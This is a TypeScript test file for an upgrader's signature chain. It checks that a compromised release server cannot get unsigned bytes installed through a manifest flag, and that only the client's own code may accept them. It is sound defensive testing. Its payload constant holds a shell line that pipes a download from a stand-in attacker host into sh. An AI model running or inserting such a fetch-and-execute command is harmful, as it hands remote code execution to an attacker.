// @invariant — a release source cannot grant itself trust.
//
// The signature chain exists to survive a compromised release source, so
// nothing the source SAYS may weaken it. Only bytes signed by a key the
// client already trusts, or an acceptance the CLIENT itself declares, get
// installed. This file is the adversarial half of distsign/verify.test.ts:
// that one proves the crypto refuses a bad chain, this one proves the chain
// cannot be talked out of running.
import { test } from "node:test";
import assert from "node:assert/strict";
import http from "node:http";
import { createHash } from "node:crypto";
import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { staticManifestSource } from "./staticManifestSource.ts";
import { createUpgrader } from "../createUpgrader.ts";
import type { HostAdapter, ProcessEvidence } from "../lifecycle/hostAdapter.ts";

const EVIL = new TextEncoder().encode("#!/bin/sh\ncurl attacker.example/x | sh\n");
const PLATFORM = `${process.platform}-${process.arch}`;

/** A release source under attacker control: it serves whatever it likes. */
async function compromisedSource(manifest: string): Promise<{ baseUrl: string; close: () => void }> {
  const server = http.createServer((req, res) => {
    if (req.url?.endsWith("manifest.json")) {
      res.writeHead(200);
      res.end(manifest);
      return;
    }
    if (req.url?.endsWith(".k-sig.json")) {
      // The attacker has no key any client root ever blessed, so the honest
      // move available to them is to serve no signature at all.
      res.writeHead(404);
      res.end("absent");
      return;
    }
    res.writeHead(200);
    res.end(Buffer.from(EVIL));
  });
  await new Promise<void>((resolve) => {
    server.listen(0, "127.0.0.1", () => resolve());
  });
  const { port } = server.address() as { port: number };
  return { baseUrl: `http://127.0.0.1:${port}/app`, close: () => server.close() };
}

function evidenceHost(seen: { promoted: boolean }): HostAdapter {
  return {
    async quiesce() {},
    async stop() {},
    async start() {},
    async resume() {},
    async healthProbe(): Promise<ProcessEvidence> {
      seen.promoted = true;
      return { version: "9.9.9", pid: process.pid, startId: "attack" };
    },
  };
}

test("THE POINT: a compromised source cannot declare its own bytes acceptable", async () => {
  // Attack: serve arbitrary bytes with a MATCHING sha256 (integrity is fine --
  // the digest comes from the same attacker) and no signature. Before this
  // was closed, the manifest could add `unsigned: true` and the upgrader
  // installed the payload with the client's real root keys in place: the whole
  // two-tier chain bypassed by one JSON field, no crypto broken.
  const sha = createHash("sha256").update(EVIL).digest("hex");
  const manifest = JSON.stringify({
    version: "9.9.9",
    unsigned: true, // attacker-supplied; must have no effect
    targets: { [PLATFORM]: { file: "app.bin", sha256: sha, size: EVIL.length } },
  });
  const src = await compromisedSource(manifest);
  const stateDir = await mkdtemp(path.join(tmpdir(), "k-trust-"));
  const seen = { promoted: false };
  try {
    const upgrader = createUpgrader({
      host: evidenceHost(seen),
      source: staticManifestSource({ baseUrl: src.baseUrl }),
      policy: "auto",
      notificationSink: async () => {},
      rootKeys: ["-----BEGIN PUBLIC KEY-----\nnot-the-attackers\n-----END PUBLIC KEY-----"],
      stateDir,
    });
    const outcome = await upgrader.upgrade();
    assert.equal(outcome.result, "held", "attacker-controlled unsigned:true must not install");
    assert.equal(seen.promoted, false, "attacker bytes must never reach a slot");
  } finally {
    src.close();
    await rm(stateDir, { recursive: true, force: true });
  }
});

test("the client, and only the client, may accept unattributable bytes", async () => {
  // Same server, same refusal -- until the ADOPTER'S OWN code says so. This is
  // the shape examples/swap-tool uses: wrap the source in your code, not a
  // flag in K's.
  const sha = createHash("sha256").update(EVIL).digest("hex");
  const manifest = JSON.stringify({
    version: "9.9.9",
    targets: { [PLATFORM]: { file: "app.bin", sha256: sha, size: EVIL.length } },
  });
  const src = await compromisedSource(manifest);
  const stateDir = await mkdtemp(path.join(tmpdir(), "k-trust-"));
  const seen = { promoted: false };
  try {
    const published = staticManifestSource({ baseUrl: src.baseUrl });
    const accepted = {
      checkForUpdate: async (ctx: Parameters<typeof published.checkForUpdate>[0]) => {
        const r = await published.checkForUpdate(ctx);
        return r === null ? null : { ...r, unsigned: true };
      },
      fetchRelease: async (v: string, ctx: Parameters<typeof published.checkForUpdate>[0]) => ({
        ...(await published.fetchRelease(v, ctx)),
        unsigned: true,
      }),
    };
    const upgrader = createUpgrader({
      host: evidenceHost(seen),
      source: accepted,
      policy: "auto",
      notificationSink: async () => {},
      rootKeys: [],
      stateDir,
    });
    const outcome = await upgrader.upgrade();
    assert.equal(outcome.result, "promoted");
    // and it is RECORDED as unverified rather than quietly counted as verified
    assert.equal((await upgrader.state()).experimentSignatureVerified, undefined);
  } finally {
    src.close();
    await rm(stateDir, { recursive: true, force: true });
  }
});
